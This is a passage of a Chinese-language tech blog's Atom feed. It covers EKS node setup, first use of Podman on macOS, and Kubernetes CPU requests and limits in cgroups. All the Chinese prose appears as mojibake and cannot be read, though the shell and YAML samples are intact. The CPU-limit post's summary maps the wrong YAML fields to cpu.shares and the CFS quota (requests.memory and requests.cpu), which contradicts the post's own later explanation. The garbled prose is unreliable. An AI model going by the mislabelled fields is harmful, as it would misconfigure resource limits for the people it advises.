è¢«å…¶ä»–ç¯€é»æˆ–æ˜¯å…¶ä»–æ‡‰ç”¨ç´¢å–å®Œç•¢ï¼Œå°è‡´æŸäº›ç¯€é»çš„ <code>aws-node</code> (VPC CNI) æ²’æœ‰è¾¦æ³•æ­£å¸¸ç´¢å– IPã€‚è§£æ±ºæ–¹æ³•ç‚ºè¨­å®š <code>WARM_ENI_TARGET</code> èˆ‡ <code>WARM_IP_TARGET</code> åƒæ•¸ï¼Œä¾†è®“å‰›ç¯€é»ä¸€è¢«éƒ¨ç½²æ™‚å°±é å…ˆä¿ç•™å¥½å¯ç”¨çš„ IPï¼Œå³æ™‚ç•¶æ™‚ Pod é‚„æ²’æœ‰è¢«å»ºç«‹ã€‚</p><h2 id="Customize-kubelet-Arguments"><a href="#Customize-kubelet-Arguments" class="headerlink" title="Customize kubelet Arguments"></a>Customize kubelet Arguments</h2><p>æŸäº›æ™‚å€™éœ€è¦å®¢è£½åŒ–æˆ‘å€‘çš„ç¯€é»ï¼Œä¾‹å¦‚ä¿®æ”¹ container runtimeï¼ˆEKS 1.23 å·²ç¶“å°‡é è¨­ container runtime æ›æˆ containerdï¼‰</p><p>Amazon EKS optimized Amazon Linux AMI åœ¨é–‹æ©Ÿæ™‚æœƒå‘¼å« <code>/etc/eks/bootstrap.sh</code> åœ¨åŸ·è¡Œå¿…è¦çš„åˆå§‹åŒ–</p><p>ç„¶è€Œè©²è…³æœ¬å°±æœ‰æä¾›åƒæ•¸å¯ä¾›èª¿æ•´ï¼Œä¾‹å¦‚æˆ‘æƒ³è¦æ›¿æ› container runtime å¯ä»¥åœ¨ launch template ä¸­æ”¹å¯« user-data æˆ</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">/etc/eks/bootstrap.sh demo-k8s --container-runtime containerd</span><br></pre></td></tr></tbody></table></figure><p>æƒ³è¦ä¿®æ”¹ kubelet çš„å•Ÿå‹•åƒæ•¸å¯ä»¥ç”¨ <code>--kubelet-extra-args</code> ä¾†ä¿®æ”¹</p><h2 id="å¾Œè¨˜"><a href="#å¾Œè¨˜" class="headerlink" title="å¾Œè¨˜"></a>å¾Œè¨˜</h2><p>ä»¥ä¸Šç‚ºé€™å¹¾é€±ç¬¬ä¸€æ¬¡ä½¿ç”¨ EKS çš„ç´€éŒ„ä»¥åŠå€‹äººèªç‚ºæ¯”è¼ƒå®¹æ˜“æ··æ·†æˆ–æ˜¯æ¨¡ç³Šçš„é»ï¼Œè¦å»ºæ§‹ä¸€å€‹å¯ä¿¡è³´çš„ EKS è¦è€ƒé‡çš„å…§å®¹äº”èŠ±å…«é–€ã€‚é€™é‚„åªæ˜¯ä¸€äº›åœ¨æ¶æ§‹ä¸Šçš„æ¦‚å¿µé‡æ¸…è€Œå·²ï¼Œå¦‚æœè¦å¾€å¢é›†å…§éƒ¨é‘½ç ”ï¼Œæœ‰æ›´å¤šè¦æ³¨æ„èˆ‡å¯ä»¥èª¿æ•™çš„åœ°æ–¹ã€‚é€™ç¯‡æ–‡ç« åŒæ™‚ä¹Ÿçµ¦ä»¥å¾Œçš„è‡ªå·±åƒè€ƒï¼Œæœªä¾†æœ‰æ©Ÿæœƒå†å¯«å…¶ä»–æ–‡ç« æ¢è¨ä¸åŒå±¤é¢éœ€è¦è€ƒé‡çš„è­°é¡Œã€‚</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="AWS" scheme="https://blog.yiyu0x.org/tags/AWS/"/>
    
      <category term="EKS" scheme="https://blog.yiyu0x.org/tags/EKS/"/>
    
      <category term="Kubernetes" scheme="https://blog.yiyu0x.org/tags/Kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>åœ¨ macOS ä¸Šä½¿ç”¨ Podman</title>
    <link href="https://blog.yiyu0x.org/2022/07/07/"/>
    <id>https://blog.yiyu0x.org/2022/07/07/</id>
    <published>2022-07-07T01:34:03.000Z</published>
    <updated>2025-04-12T20:59:43.592Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>Podman ç›¸è¼ƒæ–¼ Docker æœ‰è¨±å¤šå„ªå‹¢ï¼Œæœ¬æ–‡ç‚ºåœ¨ macOS ä¸Šåˆæ¬¡ä½¿ç”¨ Podman ä¹‹ç°¡çŸ­ç´€éŒ„ã€‚éç¨‹ä¸­ä¸æ¢ç©¶å¤ªæ·±å…¥çš„ Podman  é‹ä½œåŸç†ï¼Œå–®ç´”ä¾ç…§ä¸€èˆ¬é‹è¡Œ container çš„æ€æƒ³ä¾†ä½¿ç”¨ Podmanï¼Œçœ‹çœ‹æœƒé‡åˆ°ä»€éº¼å•é¡Œ</p><h2 id="å®‰è£"><a href="#å®‰è£" class="headerlink" title="å®‰è£"></a>å®‰è£</h2><p>Podman èˆ‡ Docker ä¸€æ¨£æœ‰æ¡Œé¢ç‰ˆæœ¬èˆ‡éæ¡Œé¢ç‰ˆæœ¬ï¼Œæ¡Œé¢ç‰ˆæœ¬å¤šäº† UI å¯ä¾›æŸ¥çœ‹ï¼ŒæŒ‘é¸ä¸€ç¨®å–œæ­¡çš„å®‰è£å³å¯</p><p>æ¡Œé¢ç‰ˆï¼š</p><p><code>brew install podman-desktop</code></p><p>éæ¡Œé¢ç‰ˆï¼š</p><p><code>brew install podman</code></p><p>æª¢æŸ¥å®‰è£ç‰ˆæœ¬ï¼š</p><p><code>podman version</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cannot connect to Podman. Please verify your connection to the Linux system using `podman system connection list`, or try `podman machine init` and `podman machine start` to manage a new Linux VM</span><br><span class="line">Error: unable to connect to Podman. failed to create sshClient: Connection to bastion host (ssh://core@localhost:52568/run/user/1000/podman/podman.sock) failed.: dial tcp [::1]:52568: connect: connection refused</span><br></pre></td></tr></tbody></table></figure><p>é¦¬ä¸Šé‡åˆ°ç¬¬ä¸€å€‹å•é¡Œï¼ŒæŒ‰ç…§æç¤ºä½¿ç”¨ <code>podman machine init</code> ä¾†å»ºç«‹ Linux VMï¼Œé‹ä½œåŸç†çŒœæ¸¬èˆ‡ Docker on macOS  é¡ä¼¼ï¼Œä¸é Docker Desktop ä¸ç”¨æ‰‹å‹•å»ºç«‹ VM</p><p>æª¢æŸ¥æ˜¯å¦æœ‰å•Ÿå‹• podman éœ€è¦çš„ VMï¼š</p><p><code>podman machine list</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NAME                     VM TYPE     CREATED         LAST UP        CPUS        MEMORY      DISK SIZE</span><br><span class="line">podman-machine-default*  qemu        37 minutes ago  3 minutes ago  1           2.147GB     10.74GB</span><br></pre></td></tr></tbody></table></figure><p>å¯ä»¥çœ‹åˆ° VM å·²ç¶“è¢«æ­£ç¢ºå•Ÿå‹•ï¼ˆè€Œä¸”æ˜¯ä½¿ç”¨ qemu ä¾†å•Ÿå‹•çš„ï¼‰ï¼Œä½†ä¾ç…§å ±ä¸€æ¨£çš„éŒ¯èª¤ã€‚å¾Œä¾†æŸ¥äº† <a href="https://github.com/containers/podman/issues/12728" target="_blank" rel="noopener">issue#12728</a> ç™¼ç¾ Podman å˜—è©¦ä½¿ç”¨ $SSH_AUTH_SOCK è®Šæ•¸è¨­å®šçš„ address ä¾†é€£ç·šï¼Œå¯ä»¥å–æ¶ˆè¨­ç½®è©²è®Šæ•¸ä¾†è§£æ±ºè©²å•é¡Œ</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unset SSH_AUTH_SOCK</span><br></pre></td></tr></tbody></table></figure><p>ï¼ˆè«‹ä¾ç…§ä½ çš„ shell æ”¾ç½®åˆ°å°æ‡‰çš„æª”æ¡ˆä¸­ï¼‰</p><p>æ¥ä¸‹ä¾†å°±å¯ä»¥çœ‹åˆ° Podman çš„ç‰ˆæœ¬è³‡è¨Šï¼š</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Client:</span><br><span class="line">Version:      3.4.1</span><br><span class="line">API Version:  3.4.1</span><br><span class="line">Go Version:   go1.17.2</span><br><span class="line">Built:        Wed Oct 20 05:14:42 2021</span><br><span class="line">OS/Arch:      darwin/amd64</span><br><span class="line"></span><br><span class="line">Server:</span><br><span class="line">Version:      4.1.1</span><br><span class="line">API Version:  4.1.1</span><br><span class="line">Go Version:   go1.18.3</span><br><span class="line">Built:        Wed Jun 15 22:31:58 2022</span><br><span class="line">OS/Arch:      linux/amd64</span><br></pre></td></tr></tbody></table></figure><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>æœå°‹ Imageï¼š</p><p><code>podman search busybox</code></p><p>ä¾ç…§ output å¯ä»¥ç™¼ç¾é è¨­æ˜¯å»æœå°‹ docker hub (hub.docker.com)</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">INDEX       NAME                                         DESCRIPTION                                                                                STARS       OFFICIAL    AUTOMATED</span><br><span class="line">docker.io   docker.io/library/busybox                    Busybox base image.                                                                        2660        [OK]</span><br><span class="line">docker.io   docker.io/rancher/busybox                                                                                                               0</span><br><span class="line">docker.io   docker.io/ibmcom/busybox                                                                                                                0</span><br><span class="line">......</span><br></pre></td></tr></tbody></table></figure><p>ä¸‹è¼‰ Image åˆ°æœ¬åœ°ï¼š</p><p><code>podman pull busybox</code></p><p>åŸ·è¡Œ busybox imageï¼š</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">podman run -it --rm busybox</span><br><span class="line">/ #</span><br><span class="line">/ #</span><br><span class="line">/ #</span><br><span class="line">/ # exit</span><br></pre></td></tr></tbody></table></figure><p>ä½¿ç”¨èµ·ä¾†èˆ‡ Docker ä¸¦ç„¡äºŒç•°</p><h2 id="ç™¼ç¾"><a href="#ç™¼ç¾" class="headerlink" title="ç™¼ç¾"></a>ç™¼ç¾</h2><h3 id="registries-è¨­å®šæª”æ¡ˆ"><a href="#registries-è¨­å®šæª”æ¡ˆ" class="headerlink" title="registries è¨­å®šæª”æ¡ˆ"></a>registries è¨­å®šæª”æ¡ˆ</h3><p>æ•…æ„æ‹‰ä¸€å€‹ä¸å­˜åœ¨çš„ image</p><p><code>podman pull this-is-error</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Resolving "this-is-error" using unqualified-search registries (/etc/containers/registries.conf.d/999-podman-machine.conf)</span><br></pre></td></tr></tbody></table></figure><p>æœƒç™¼ç¾ podman é€é <code>/etc/containers/registries.conf.d/999-podman-machine.conf</code> è¨­å®šä¾†æ±ºå®šå®Œæ•´çš„ Image åç¨±ï¼ˆå› ç‚ºæ²’æœ‰æŒ‡å®š registry ç†è«–ä¸Šç„¡æ³•å®šä½è©² Image ä½ç½®ï¼‰</p><p>åˆ° VM ä¸­æª¢æŸ¥ä¸€ä¸‹è©²æª”æ¡ˆï¼Œå°±å¯ä»¥ç™¼ç¾åŸä¾†æ˜¯é è¨­æ‰¾ä¸åˆ° image å°±å» <code>docker.io</code> æ‰¾</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â¯ podman machine ssh</span><br><span class="line">Connecting to vm podman-machine-default. To close connection, use `~.` or `exit`</span><br><span class="line">Warning: Permanently added '[localhost.nctu.edu.tw]:52568' (ED25519) to the list of known hosts.</span><br><span class="line">Fedora CoreOS 36.20220703.2.1</span><br><span class="line">Tracker: https://github.com/coreos/fedora-coreos-tracker</span><br><span class="line">Discuss: https://discussion.fedoraproject.org/tag/coreos</span><br><span class="line"></span><br><span class="line">Last login: Thu Jul  7 01:50:15 2022 from 192.168.127.1</span><br><span class="line">[core@localhost ~]$ cat /etc/containers/registries.conf.d/999-podman-machine.conf</span><br><span class="line">unqualified-search-registries=["docker.io"]</span><br><span class="line">[core@localhost ~]$</span><br></pre></td></tr></tbody></table></figure><p>å¦å¤–ä¹Ÿç™¼ç¾å…¶ä»– registries çš„è¨­å®šæª”</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[core@localhost containers]$ cd /etc/containers/registries.conf.d</span><br><span class="line">[core@localhost registries.conf.d]$ ls</span><br><span class="line">000-shortnames.conf  999-podman-machine.conf</span><br><span class="line">[core@localhost registries.conf.d]$ cat 000-shortnames.conf</span><br><span class="line">[aliases]</span><br><span class="line">  # almalinux</span><br><span class="line">  "almalinux" = "docker.io/library/almalinux"</span><br><span class="line">  "almalinux-minimal" = "docker.io/library/almalinux-minimal"</span><br><span class="line">  # Arch Linux</span><br><span class="line">  "archlinux" = "docker.io/archlinux/archlinux"</span><br><span class="line">  # centos</span><br><span class="line">  "centos" = "quay.io/centos/centos"</span><br><span class="line">  # containers</span><br><span class="line">  "skopeo" = "quay.io/skopeo/stable"</span><br><span class="line">  "buildah" = "quay.io/buildah/stable"</span><br><span class="line">  "podman" = "quay.io/podman/stable"</span><br><span class="line">  "hello" = "quay.io/podman/hello"</span><br><span class="line">  "hello-world" = "quay.io/podman/hello"</span><br><span class="line">  # docker</span><br><span class="line">  "alpine" = "docker.io/library/alpine"</span><br><span class="line">  "docker" = "docker.io/library/docker"</span><br><span class="line">  "registry" = "docker.io/library/registry"</span><br><span class="line">  "swarm" = "docker.io/library/swarm"</span><br></pre></td></tr></tbody></table></figure><p>å¯ä»¥ç™¼ç¾åŸä¾†æœ‰äº› image æ˜¯é€é alias çš„æ–¹å¼ä¾†æ±ºå®šä½ç½®çš„</p><h3 id="Port-Forward-é¡¯ç¤ºä¸æ­£å¸¸"><a href="#Port-Forward-é¡¯ç¤ºä¸æ­£å¸¸" class="headerlink" title="Port Forward é¡¯ç¤ºä¸æ­£å¸¸"></a>Port Forward é¡¯ç¤ºä¸æ­£å¸¸</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">â¯ podman run -itd -p 8888:80 nginx</span><br><span class="line">be5cb3e60f7b714e3b9c3462610675dd8cc7eaf0c048cdef7c3c8ea011979096</span><br><span class="line"></span><br><span class="line">â¯ podman run -itd -P nginx</span><br><span class="line">9a2adbd0e86c0083ad0af5bccedc7f5dbaa3b64599c982368f8e64b301eac25d</span><br><span class="line"></span><br><span class="line">â¯ podman ps</span><br><span class="line">CONTAINER ID  IMAGE                           COMMAND               CREATED         STATUS             PORTS             NAMES</span><br><span class="line">be5cb3e60f7b  docker.io/library/nginx:latest  nginx -g daemon o...  17 seconds ago  Up 18 seconds ago  0.0.0.0:0->0/tcp  unruffled_bouman</span><br><span class="line">9a2adbd0e86c  docker.io/library/nginx:latest  nginx -g daemon o...  3 seconds ago   Up 4 seconds ago   0.0.0.0:0->0/tcp  laughing_wiles</span><br></pre></td></tr></tbody></table></figure><p>åœ¨ <code>podman ps</code> ä¸­çœ‹ä¸åˆ°è¢« binding å‡ºä¾†çš„ Ports æœ‰äº›ä¸æ–¹ä¾¿</p><p>ä¸éé€é <code>podman inspect</code> é‚„æ˜¯æ‰¾å¾—å‡ºä¾†</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">â¯ podman inspect be5cb3e60f7b | grep -A5 "PortBindings"</span><br><span class="line">            "PortBindings": {</span><br><span class="line">                "80/tcp": [</span><br><span class="line">                    {</span><br><span class="line">                        "HostIp": "",</span><br><span class="line">                        "HostPort": "8888"</span><br><span class="line">                    }</span><br><span class="line"></span><br><span class="line">â¯ podman inspect 9a2adbd0e86c | grep -A5 "PortBindings"</span><br><span class="line">            "PortBindings": {</span><br><span class="line">                "80/tcp": [</span><br><span class="line">                    {</span><br><span class="line">                        "HostIp": "",</span><br><span class="line">                        "HostPort": "45521"</span><br><span class="line">                    }</span><br></pre></td></tr></tbody></table></figure><p>è‡³æ–¼ä¸€äº›è¤‡é›œçš„ç”¨æ³•æš«æ™‚é‚„æ²’æœ‰æ¸¬è©¦éï¼Œä¹Ÿä¸ç¢ºå®šå·®ç•°æ˜¯å¦å¾ˆå¤§</p><p>æˆ‘æƒ³æœ€å¤§çš„å·®ç•°å¯èƒ½é‚„æ˜¯æœƒåœ¨ networking çš„éƒ¨åˆ†ï¼ŒPodman å®˜æ–¹ä¹Ÿæœ‰çµ¦å‡º<a href="https://github.com/containers/podman/blob/main/docs/tutorials/basic_networking.md" target="_blank" rel="noopener">ä¸€é ä»‹ç´¹</a>ä¾†èªªæ˜ Podman çš„ç¶²è·¯æ¶æ§‹</p><p>é€™éƒ¨åˆ†å°±ç­‰åˆ°æœ‰æ™‚é–“ç ”ç©¶å®Œä¹‹å¾Œå†ä¾†è£œä¸Šä½¿ç”¨å¿ƒå¾—äº† ğŸ˜…</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="podman" scheme="https://blog.yiyu0x.org/tags/podman/"/>
    
      <category term="container" scheme="https://blog.yiyu0x.org/tags/container/"/>
    
  </entry>
  
  <entry>
    <title>ç†è§£ Kubernetes ä¸­çš„ CPU Limit</title>
    <link href="https://blog.yiyu0x.org/2021/12/13/"/>
    <id>https://blog.yiyu0x.org/2021/12/13/</id>
    <published>2021-12-13T00:50:50.000Z</published>
    <updated>2025-04-12T20:59:43.595Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>Kubernetes ä¸­çš„è³‡æºé™åˆ¶ç›®å‰å¯ä»¥å°å…©ç¨®è³‡æºåšé™åˆ¶ï¼Œåˆ†åˆ¥ç‚º <code>cpu</code>ï¼ˆå¯å£“ç¸®è³‡æºï¼‰, <code>memory</code>ï¼ˆä¸å¯å£“ç¸®è³‡æºï¼‰ã€‚é‡å°é€™å…©ç¨®è³‡æºçš„é™åˆ¶å¯ä»¥å°æ‡‰åˆ°å…©ç¨®é™åˆ¶ï¼Œåˆ†åˆ¥ç‚º Soft Limitï¼ˆrequestï¼‰èˆ‡ Hard Limitï¼ˆlimitï¼‰</p><p>cgroup å°æ–¼é€™å…©ç¨®è³‡æºé”åˆ° Hard Limit çš„è™•ç†ä¸¦ä¸ç›¸åŒã€‚è¨˜æ†¶é«”è¶…å‡º Hard Limit æœƒè§¸ç™¼ OOMï¼›CPU è¶…å‡º Hard Limit å‰‡æ˜¯æœƒé€ æˆ CPU Throttlingï¼ˆç¨‹å¼ä¸¦ä¸æœƒè¢«çµ‚æ­¢ï¼‰</p><p>åœ¨ Cgroup ä¸­ä½¿ç”¨é‡å° K8s Pod yaml æ‰€å®šç¾©ä¹‹ Soft Limitï¼š</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spec.containers[].resources.requests.memory</span><br></pre></td></tr></tbody></table></figure><p>æœƒè®“ Cgroup è¨­å®šç³»çµ±ä¹‹ <code>cpu.shares</code> åƒæ•¸</p><p>è€Œ Hard Limitï¼š</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spec.containers[].resources.requests.cpu</span><br></pre></td></tr></tbody></table></figure><p>æœƒè®“ Cgroup è¨­å®šç³»çµ±ä¹‹ <code>cpu.cfs_period_us</code>, <code>cpu.cfs_quota_us</code> åƒæ•¸</p><h2 id="cpu-shares"><a href="#cpu-shares" class="headerlink" title="cpu.shares"></a>cpu.shares</h2><p>ç•¶æˆ‘å€‘åœ¨ Pod ä¹‹ yaml ä¸­å®šç¾© <code>spec.containers[].resources.requests.cpu</code>ï¼š</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  containers:</span></span><br><span class="line"><span class="attr">  - name:</span> <span class="string">busybox</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">hwchiu/netutils</span></span><br><span class="line"><span class="attr">    args:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">sleep</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">infinity</span></span><br><span class="line"><span class="attr">    resources:</span></span><br><span class="line"><span class="attr">      requests:</span></span><br><span class="line"><span class="attr">        cpu:</span> <span class="string">"500m"</span></span><br></pre></td></tr></tbody></table></figure><p>å¯ä»¥å¾å°æ‡‰ç¯€é»çš„è·¯å¾‘ç™¼ç¾å„ç¨® cgroup åƒæ•¸</p><p><code>/sys/fs/cgroup/cpu,cpuacct/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod<Pod-uid>.slice</code></p><p>(å› ç‚ºåªæœ‰è¨­å®š request æ‰€ä»¥æ˜¯é€²å…¥ burstable ç›®éŒ„ï¼Œé—œæ–¼ Pod QoS å¯ä»¥åƒè€ƒ Kubernetes å®˜æ–¹æ–‡ä»¶)</p><p>æ­¤æ™‚å¯ä»¥ç™¼ç¾</p><p>æª”æ¡ˆï¼šcpu.cfs_quota_us çš„å…§å®¹ç‚º <code>-1</code>ï¼ˆå› ç‚ºæ²’æœ‰è¨­å®š Hard Limitï¼Œ-1 ä»£è¡¨ä¸å—é™åˆ¶ï¼‰ï¼Œè€Œ cpu.shares çš„å…§å®¹ç‚º <code>512</code>ï¼ˆèˆ‡è¨­å®šçš„ 500m ä¸ç›¸åŒæ˜¯å› ç‚º cgroup ä»¥ 1024 ç‚ºåº•ï¼Œyaml ä»¥ 1000 ç‚ºåº•ï¼‰</p><p>è€Œé€™å€‹ 512 æœƒè®“è©² Podï¼ˆä»¥ä¸‹ç¨±ç‚º Pod Aï¼‰å…·æœ‰</p><p>512 / (512 + Other Pod cpu.shares) çš„ CPU ä½¿ç”¨æ™‚é–“</p><p>å‡è¨­å¢é›†ä¸­åªæœ‰å…©å€‹ Podï¼Œå¦å¤–ä¸€å€‹ Pod çš„ cpu.shares ç‚º 1024</p><p>å‰‡ Pod A çš„ä½¿ç”¨æ™‚é–“æœ‰</p><p>512/(512 + 1024) = 33%</p><p>é€™ç¨®ç›¸å°çš„è¨­å®šæ–¹å¼å¾ˆæ˜é¡¯çš„å¯ä»¥ç™¼ç¾ä¸¦æ²’æœ‰è¾¦æ³•å¯¦è³ªæ§åˆ¶ Pod åœ¨ CPU çš„æ™‚é–“åˆ†é…</p><h2 id="cpu-cfs-quota-us"><a href="#cpu-cfs-quota-us" class="headerlink" title="cpu.cfs_quota_us"></a>cpu.cfs_quota_us</h2><p>ç„¶è€Œå¦‚æœè¨­å®šçš„ Pod yaml ç‚ºï¼š</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">resources:</span></span><br><span class="line"><span class="attr">  requests:</span></span><br><span class="line"><span class="attr">    cpu:</span> <span class="string">"500m"</span></span><br><span class="line"><span class="attr">  limits:</span></span><br><span class="line"><span class="attr">    cpu:</span> <span class="string">"900m"</span></span><br></pre></td></tr></tbody></table></figure><p>å¯ä»¥ç™¼ç¾ cpu.cfs_period_us çš„å€¼ç‚º <code>100000</code>ï¼Œä»¥åŠ cpu.cfs_quota_us çš„å€¼ç‚º <code>90000</code></p><p>100000 çš„å«ç¾©ä»£è¡¨ CPU ä¸€å€‹é€±æœŸï¼Œä¹Ÿå°±æ˜¯ 1/10 ç§’ï¼ˆ100000 å¾®ç§’ï¼‰</p><p>90000 ä»£è¡¨åœ¨é€™å€‹é€±æœŸå…§ï¼Œè©² Pod æœ€é«˜å¯ä»¥ä½¿ç”¨çš„æ™‚é–“ç‚º 90000 å¾®ç§’ï¼Œä¹Ÿå°±æ˜¯ yaml ä¸­è¨­å®šçš„ 900m</p><p>æ›å¥èªªè©±ï¼Œå¦‚æœæˆ‘å€‘è¦è®“ Pod åœ¨ä¸€å€‹ CPU é€±æœŸå¯ä»¥å®Œå…¨è·‘æ»¿ï¼Œé‚£å°±è¦è¨­å®š 1000m</p><p>å¦‚æœä½¿ç”¨åˆ°ä¸Šé™ï¼Œç¨‹å¼é‚„æ²’çµæŸï¼Œè©² CPU é€±æœŸå…§çš„è©²ç¨‹å¼å°±æœƒè¢« Throttlingï¼Œç•™åˆ°ä¸‹ä¸€å€‹é€±æœŸæ‰èƒ½ç¹¼çºŒåŸ·è¡Œ</p><p>ä½†æ˜¯ä¸€ä½†è¨­å®šäº† Hard Limit åŒæ™‚ä»£è¡¨ç³»çµ±ä¸Šçš„ CPU ä¸å¿™ç¢Œï¼Œè©² Pod ä¹Ÿç„¡æ³•ä½¿ç”¨æ›´å¤šçš„ CPU æ™‚é–“</p><h2 id="åƒè€ƒè³‡æ–™"><a href="#åƒè€ƒè³‡æ–™" class="headerlink" title="åƒè€ƒè³‡æ–™"></a>åƒè€ƒè³‡æ–™</h2><ul><li><a href="https://www.youtube.com/watch?v=UE7QX98-kO0" target="_blank" rel="noopener">Throttling: New Developments in Application Performance with CPU Limits - Dave Chiluk, Indeed</a></li><li><a href="https://zhuanlan.zhihu.com/p/433065108" target="_blank" rel="noopener">k8s CPU limit å’Œ throttling çš„è¿·æ€</a></li></ul></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="Kubernetes" scheme="https://blog.yiyu0x.org/tags/Kubernetes/"/>
    
      <category term="cgroup" scheme="https://blog.yiyu0x.org/tags/cgroup/"/>
    
  </entry>
  
  <entry>
    <title>ä¸€æ¬¡ CI/CD èª¿æ•™ç¶“é©—</title>
    <link href="https://blog.yiyu0x.org/2021/11/07/"/>
    <id>https://blog.yiyu0x.org/2021/11/07/</id>
    <published>2021-11-07T11:05:24.000Z</published>
    <updated>2025-04-12T20:59:43.591Z</updated>
    
